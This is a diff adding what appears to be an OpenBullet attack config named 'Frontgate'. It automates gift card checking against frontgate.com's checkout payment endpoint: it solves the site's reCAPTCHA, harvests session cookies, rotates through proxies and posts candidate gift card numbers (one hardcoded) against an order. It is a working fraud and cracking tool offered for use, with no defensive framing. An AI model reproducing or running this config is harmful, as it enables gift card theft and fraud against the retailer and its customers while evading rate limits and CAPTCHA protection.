@@ -1,0 +1,47 @@
+[SETTINGS]
+{
+  "Name": "Frontgate",
+  "SuggestedBots": 1,
+  "LastModified": "2018-06-09T13:26:52.1041574+00:00",
+  "AdditionalInfo": "",
+  "Author": "IncogniBarbie",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#Get_Balance_page REQUEST GET "https://www.frontgate.com/PIAdd" AutoRedirect=TRUE 
+  CONTENT "storeId=10053&catalogId=10053&langId=-1&errorViewName=FailureView&URL=/OrderRecap?checkoutV2=true&account=<USER>&applygift=true&payMethodId=GIFTCARD&paymentType=GiftCard&g-recaptcha-response=<RECAP>&piAmount=3051.04&orderId=59636470&checkoutV2=true&returnRespAsJSON=true" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://www.frontgate.com/SinglePageCheckoutView" 
+  HEADER "Origin: https://www.frontgate.com/" 
+RECAPTCHA "https://www.frontgate.com/SinglePageCheckoutView" "6LcmMR8UAAAAAAQwSkqd05ID9tz1UJ8dLlIxYGQy" -> VAR "RECAP" 
+#JSESSION PARSE "<COOKIES(JSESSIONID)>" LR "" "" Recursive=FALSE -> VAR "JSESSIONID" "" "" 
+#CSB PARSE "<COOKIES(CSB_USER_STATE)>" LR "" "" Recursive=FALSE -> VAR "CSB" "" "" 
+#POST REQUEST POST "https://www.frontgate.com/PIAdd" AutoRedirect=FALSE 
+  CONTENT "storeId=10053&catalogId=10053&langId=-1&errorViewName=FailureView&URL=/OrderRecap?checkoutV2=true&account=5896298270000060117&applygift=true&payMethodId=GIFTCARD&paymentType=GiftCard&g-recaptcha-response=<RECAP>&piAmount=3051.04&orderId=59636470&checkoutV2=true&returnRespAsJSON=true" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "Jsession: <JSESSIONID>" 
+  COOKIE "INTL_SHIPPING_CTX: US|USD" 
+  COOKIE "CSB_USER_STATE: <CSB>" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: https://www.frontgate.com/" 
+  HEADER "Referrer: https://www.frontgate.com/SinglePageCheckoutView" 
